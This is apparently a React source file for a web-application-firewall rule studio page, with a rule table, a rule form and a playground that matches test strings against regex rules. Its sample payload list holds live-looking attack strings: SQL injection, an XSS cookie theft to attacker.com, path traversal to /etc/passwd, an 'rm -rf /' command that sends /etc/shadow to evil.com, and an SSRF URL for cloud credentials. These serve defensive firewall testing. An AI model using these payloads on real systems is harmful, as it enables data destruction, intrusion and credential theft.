"use client";

import React, { useState } from "react";
import {
  Sliders,
  ShieldAlert,
  ShieldCheck,
  Plus,
  Play,
  Trash2,
  ToggleLeft,
  ToggleRight,
  Terminal,
  Activity,
  CheckCircle2,
  XCircle,
  AlertTriangle,
  Zap,
} from "lucide-react";
import { useAegis } from "@/context/AegisContext";
import { FirewallRule, WafTestResult } from "@/types/aegis";
import { formatNumber } from "@/lib/utils";

const SAMPLE_PAYLOADS = [
  {
    name: "SQL Injection: Auth Bypass",
    payload: "admin' OR 1=1; SELECT pg_sleep(5);--",
  },
  {
    name: "Cross-Site Scripting (XSS)",
    payload: "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>",
  },
  {
    name: "Path Traversal / LFI",
    payload: "../../../../etc/passwd\0",
  },
  {
    name: "Remote Code Execution (RCE)",
    payload: "; rm -rf / ; cat /etc/shadow | curl -X POST -d @- evil.com",
  },
  {
    name: "SSRF AWS IMDSv1",
    payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
  },
  {
    name: "Normal Legitimate Request",
    payload: "GET /api/v1/products?category=electronics&limit=20 HTTP/1.1",
  },
];

export default function WafStudioPage() {
  const { firewallRules, toggleFirewallRule, addFirewallRule, deleteFirewallRule, testWafPayload } =
    useAegis();

  const [testInput, setTestInput] = useState<string>("admin' OR 1=1; SELECT pg_sleep(5);--");
  const [testResult, setTestResult] = useState<WafTestResult | null>(null);
  const [isModalOpen, setIsModalOpen] = useState(false);

  // Form State
  const [newRule, setNewRule] = useState({
    name: "",
    action: "BLOCK" as FirewallRule["action"],
    protocol: "HTTPS" as FirewallRule["protocol"],
    sourceCidr: "0.0.0.0/0",
    targetPort: "443",
    patternRegex: "",
    status: "ACTIVE" as FirewallRule["status"],
    description: "",
  });

  const handleRunTest = () => {
    const res = testWafPayload(testInput);
    setTestResult(res);
  };

  const handleCreateRule = (e: React.FormEvent) => {
    e.preventDefault();
    if (!newRule.name || !newRule.patternRegex) return;

    addFirewallRule(newRule);
    setIsModalOpen(false);
    setNewRule({
      name: "",
      action: "BLOCK",
      protocol: "HTTPS",
      sourceCidr: "0.0.0.0/0",
      targetPort: "443",
      patternRegex: "",
      status: "ACTIVE",
      description: "",
    });
  };

  const totalHits = firewallRules.reduce((acc, r) => acc + r.hitsCount, 0);
  const activeCount = firewallRules.filter((r) => r.status === "ACTIVE").length;

  return (
    <div className="max-w-7xl mx-auto px-4 sm:px-6 py-8 font-mono">
      {/* Page Header */}
      <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 mb-8">
        <div>
          <div className="flex items-center gap-2 mb-1">
            <Sliders className="w-5 h-5 text-cyan-400" />
            <h1 className="text-xl sm:text-2xl font-black text-white tracking-wider">
              WAF RULE STUDIO & THREAT INJECTION
            </h1>
          </div>
          <p className="text-xs text-slate-400">
            ModSecurity Regular Expression Matcher, Live Packet Inspection & Rule Enforcement
          </p>
        </div>

        <button
          onClick={() => setIsModalOpen(true)}
          className="px-4 py-2 rounded-xl bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-slate-950 font-black text-xs flex items-center gap-2 transition-all shadow-lg shadow-cyan-500/20 active:scale-95"
        >
          <Plus className="w-4 h-4" />
          <span>New Firewall Rule</span>
        </button>
      </div>

      {/* KPI Stats */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 mb-8">
        <div className="p-4 rounded-2xl bg-[#090f24] border border-slate-800">
          <div className="text-[10px] text-slate-400 font-bold uppercase mb-1">Active Rules</div>
          <div className="text-2xl font-black text-cyan-400">{activeCount} / {firewallRules.length}</div>
          <div className="text-[10px] text-emerald-400 mt-1">Filtering All Ingress Traffic</div>
        </div>

        <div className="p-4 rounded-2xl bg-[#090f24] border border-slate-800">
          <div className="text-[10px] text-slate-400 font-bold uppercase mb-1">Cumulative Threat Blocks</div>
          <div className="text-2xl font-black text-white">{formatNumber(totalHits)}</div>
          <div className="text-[10px] text-slate-400 mt-1">Automated Layer 7 Dropped</div>
        </div>

        <div className="p-4 rounded-2xl bg-[#090f24] border border-slate-800">
          <div className="text-[10px] text-slate-400 font-bold uppercase mb-1">Inspection Latency</div>
          <div className="text-2xl font-black text-emerald-400">0.42 ms</div>
          <div className="text-[10px] text-slate-400 mt-1">Sub-millisecond Regex Engine</div>
        </div>

        <div className="p-4 rounded-2xl bg-[#090f24] border border-slate-800">
          <div className="text-[10px] text-slate-400 font-bold uppercase mb-1">Virtual Patches</div>
          <div className="text-2xl font-black text-purple-400">
            {firewallRules.filter((r) => r.id.includes("waf-patch")).length}
          </div>
          <div className="text-[10px] text-slate-400 mt-1">Zero-Day Immunization Active</div>
        </div>
      </div>

      {/* Split-Screen: Interactive Simulator & Active Rules */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-8">
        {/* Left Column: Attack Payload Injection Simulator */}
        <div className="lg:col-span-5 flex flex-col gap-6">
          <div className="p-6 rounded-3xl border border-slate-800 bg-[#080d20] shadow-xl">
            <div className="flex items-center gap-2 mb-4">
              <Terminal className="w-5 h-5 text-cyan-400" />
              <h2 className="text-sm font-bold text-white tracking-wider">
                PAYLOAD INJECTION PLAYGROUND
              </h2>
            </div>

            <p className="text-xs text-slate-400 mb-4 leading-relaxed font-sans">
              Uji ketangguhan aturan WAF terhadap serangan sintetis secara real-time. Mesin regex akan mencocokkan payload terhadap seluruh aturan aktif.
            </p>

            {/* Quick Samples */}
            <div className="mb-4">
              <label className="text-[10px] text-slate-400 font-bold uppercase block mb-2">
                Pilih Sampel Payload Serangan:
              </label>
              <div className="flex flex-wrap gap-1.5">
                {SAMPLE_PAYLOADS.map((sample, idx) => (
                  <button
                    key={idx}
                    onClick={() => {
                      setTestInput(sample.payload);
                      setTestResult(null);
                    }}
                    className="px-2.5 py-1 rounded-lg bg-slate-900 hover:bg-slate-800 border border-slate-800 hover:border-slate-700 text-[10px] text-slate-300 transition-colors"
                  >
                    {sample.name}
                  </button>
                ))}
              </div>
            </div>

            {/* Payload Input */}
            <div className="mb-4">
              <label className="text-[10px] text-slate-400 font-bold uppercase block mb-1">
                Raw Input String / HTTP Body:
              </label>
              <textarea
                value={testInput}
                onChange={(e) => setTestInput(e.target.value)}
                rows={4}
                className="w-full p-3 rounded-xl bg-[#040814] border border-slate-800 text-xs text-cyan-300 focus:outline-none focus:border-cyan-500 font-mono resize-none"
                placeholder="Masukkan payload HTTP atau SQL injection..."
              />
            </div>

            {/* Test Trigger Button */}
            <button
              onClick={handleRunTest}
              className="w-full py-2.5 rounded-xl bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-black text-xs flex items-center justify-center gap-2 transition-all shadow-md shadow-cyan-500/20 active:scale-95"
            >
              <Play className="w-4 h-4 fill-current" />
              <span>Simulasikan Injeksi WAF</span>
            </button>

            {/* Test Result Display */}
            {testResult && (
              <div
                className={`mt-6 p-4 rounded-2xl border transition-all ${
                  testResult.action === "BLOCKED"
                    ? "bg-red-950/20 border-red-500/40 text-red-300"
                    : "bg-emerald-950/20 border-emerald-500/40 text-emerald-300"
                }`}
              >
                <div className="flex items-center justify-between mb-2">
                  <div className="flex items-center gap-2">
                    {testResult.action === "BLOCKED" ? (
                      <XCircle className="w-5 h-5 text-red-400" />
                    ) : (
                      <CheckCircle2 className="w-5 h-5 text-emerald-400" />
                    )}
                    <span className="font-black text-sm tracking-wider">
                      VERDICT: {testResult.action}
                    </span>
                  </div>
                  <span className="text-[10px] font-mono text-slate-400">
                    {testResult.executionTimeMs} ms
                  </span>
                </div>

                {testResult.action === "BLOCKED" && testResult.matchedRule ? (
                  <div className="space-y-1.5 text-xs">
                    <div>
                      <span className="text-slate-400">Matched Rule:</span>{" "}
                      <span className="font-bold text-white">{testResult.matchedRule.name}</span>
                    </div>
                    <div>
                      <span className="text-slate-400">Pattern:</span>{" "}
                      <code className="text-red-400 bg-red-950/40 px-1 py-0.5 rounded text-[11px]">
                        {testResult.matchedPattern}
                      </code>
                    </div>
                    <div>
                      <span className="text-slate-400">Enforced Action:</span>{" "}
                      <span className="px-2 py-0.5 rounded bg-red-500/20 border border-red-500/40 text-red-400 text-[10px] font-bold">
                        HTTP 403 FORBIDDEN (DROP)
                      </span>
                    </div>
                  </div>
                ) : (
                  <div className="text-xs text-slate-300 font-sans">
                    Payload tidak memicu aturan pemblokiran aktif apapun. Paket data diizinkan menuju upstream service.
                  </div>
                )}
              </div>
            )}
          </div>
        </div>

        {/* Right Column: Active Rules Table */}
        <div className="lg:col-span-7">
          <div className="rounded-3xl border border-slate-800 bg-[#080d20] overflow-hidden shadow-xl">
            <div className="px-6 py-4 border-b border-slate-800 flex items-center justify-between bg-[#0b122c]">
              <div className="flex items-center gap-2">
                <Sliders className="w-4 h-4 text-cyan-400" />
                <h2 className="text-sm font-bold text-white tracking-wider">
                  ACTIVE FIREWALL & WAF RULES
                </h2>
              </div>
              <span className="text-[10px] text-slate-400 font-mono">
                {firewallRules.length} Total Rules
              </span>
            </div>

            <div className="divide-y divide-slate-800/80">
              {firewallRules.map((rule) => (
                <div
                  key={rule.id}
                  className="p-5 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 hover:bg-slate-900/40 transition-colors"
                >
                  <div className="flex-1">
                    <div className="flex items-center gap-2 mb-1">
                      <span className="font-black text-white text-sm">{rule.name}</span>
                      <span
                        className={`px-2 py-0.5 rounded-full text-[10px] font-bold border ${
                          rule.action === "BLOCK"
                            ? "bg-red-500/10 text-red-400 border-red-500/30"
                            : rule.action === "RATE_LIMIT"
                            ? "bg-amber-500/10 text-amber-400 border-amber-500/30"
                            : "bg-emerald-500/10 text-emerald-400 border-emerald-500/30"
                        }`}
                      >
                        {rule.action}
                      </span>
                      {rule.id.includes("waf-patch") && (
                        <span className="px-1.5 py-0.5 rounded bg-purple-500/20 border border-purple-500/40 text-purple-300 text-[9px] font-bold">
                          VIRTUAL PATCH
                        </span>
                      )}
                    </div>

                    <p className="text-xs text-slate-400 font-sans mb-2">
                      {rule.description || "Ingress packet inspection rule"}
                    </p>

                    <div className="flex flex-wrap items-center gap-3 text-[10px] text-slate-400">
                      <span>Proto: <strong className="text-slate-200">{rule.protocol}</strong></span>
                      <span>Port: <strong className="text-slate-200">{rule.targetPort}</strong></span>
                      <span>Hits: <strong className="text-cyan-400">{formatNumber(rule.hitsCount)}</strong></span>
                      {rule.patternRegex && (
                        <span className="font-mono bg-slate-950 px-1.5 py-0.5 rounded text-slate-300 border border-slate-800">
                          Regex: {rule.patternRegex}
                        </span>
                      )}
                    </div>
                  </div>

                  <div className="flex items-center gap-3">
                    <button
                      onClick={() => toggleFirewallRule(rule.id)}
                      className="p-1.5 rounded-xl hover:bg-slate-800 text-slate-400 hover:text-white transition-colors"
                      title={rule.status === "ACTIVE" ? "Disable Rule" : "Enable Rule"}
                    >
                      {rule.status === "ACTIVE" ? (
                        <ToggleRight className="w-6 h-6 text-cyan-400" />
                      ) : (
                        <ToggleLeft className="w-6 h-6 text-slate-600" />
                      )}
                    </button>

                    <button
                      onClick={() => deleteFirewallRule(rule.id)}
                      className="p-1.5 rounded-xl hover:bg-red-950/40 text-slate-500 hover:text-red-400 transition-colors"
                      title="Delete Rule"
                    >
                      <Trash2 className="w-4 h-4" />
                    </button>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      </div>

      {/* Modal: New Firewall Rule */}
      {isModalOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-950/80 backdrop-blur-sm">
          <div className="bg-[#090f22] border border-slate-800 rounded-3xl max-w-lg w-full p-6 shadow-2xl">
            <h3 className="text-base font-black text-white mb-1">CREATE NEW WAF RULE</h3>
            <p className="text-xs text-slate-400 font-sans mb-4">
              Konfigurasikan signature pola regex dan aksi mitigasi firewall.
            </p>

            <form onSubmit={handleCreateRule} className="space-y-4">
              <div>
                <label className="text-[10px] text-slate-400 uppercase font-bold block mb-1">
                  Rule Name:
                </label>
                <input
                  type="text"
                  required
                  placeholder="e.g. Block Path Traversal Attacks"
                  value={newRule.name}
                  onChange={(e) => setNewRule({ ...newRule, name: e.target.value })}
                  className="w-full p-2.5 rounded-xl bg-slate-950 border border-slate-800 text-xs text-white focus:outline-none focus:border-cyan-500"
                />
              </div>

              <div className="grid grid-cols-2 gap-3">
                <div>
                  <label className="text-[10px] text-slate-400 uppercase font-bold block mb-1">
                    Action:
                  </label>
                  <select
                    value={newRule.action}
                    onChange={(e) =>
                      setNewRule({ ...newRule, action: e.target.value as FirewallRule["action"] })
                    }
                    className="w-full p-2.5 rounded-xl bg-slate-950 border border-slate-800 text-xs text-white focus:outline-none focus:border-cyan-500"
                  >
                    <option value="BLOCK">BLOCK</option>
                    <option value="ALLOW">ALLOW</option>
                    <option value="RATE_LIMIT">RATE_LIMIT</option>
                    <option value="CHALLENGE">CHALLENGE</option>
                  </select>
                </div>

                <div>
                  <label className="text-[10px] text-slate-400 uppercase font-bold block mb-1">
                    Protocol:
                  </label>
                  <select
                    value={newRule.protocol}
                    onChange={(e) =>
                      setNewRule({ ...newRule, protocol: e.target.value as FirewallRule["protocol"] })
                    }
                    className="w-full p-2.5 rounded-xl bg-slate-950 border border-slate-800 text-xs text-white focus:outline-none focus:border-cyan-500"
                  >
                    <option value="HTTPS">HTTPS</option>
                    <option value="HTTP">HTTP</option>
                    <option value="TCP">TCP</option>
                    <option value="UDP">UDP</option>
                  </select>
                </div>
              </div>

              <div>
                <label className="text-[10px] text-slate-400 uppercase font-bold block mb-1">
                  Regex Pattern:
                </label>
                <input
                  type="text"
                  required
                  placeholder="e.g. (?i)(\.\.\/|\.\.\\)"
                  value={newRule.patternRegex}
                  onChange={(e) => setNewRule({ ...newRule, patternRegex: e.target.value })}
                  className="w-full p-2.5 rounded-xl bg-slate-950 border border-slate-800 text-xs text-cyan-300 font-mono focus:outline-none focus:border-cyan-500"
                />
              </div>

              <div>
                <label className="text-[10px] text-slate-400 uppercase font-bold block mb-1">
                  Description:
                </label>
                <input
                  type="text"
                  placeholder="Keterangan fungsi filter..."
                  value={newRule.description}
                  onChange={(e) => setNewRule({ ...newRule, description: e.target.value })}
                  className="w-full p-2.5 rounded-xl bg-slate-950 border border-slate-800 text-xs text-white focus:outline-none focus:border-cyan-500"
                />
              </div>

              <div className="flex items-center justify-end gap-3 pt-4 border-t border-slate-800">
                <button
                  type="button"
                  onClick={() => setIsModalOpen(false)}
                  className="px-4 py-2 rounded-xl text-xs text-slate-400 hover:text-white"
                >
                  Batal
                </button>
                <button
                  type="submit"
                  className="px-4 py-2 rounded-xl bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-black text-xs shadow-md shadow-cyan-500/20"
                >
                  Save & Apply Rule
                </button>
              </div>
            </form>
          </div>
        </div>
      )}
    </div>
  );
}
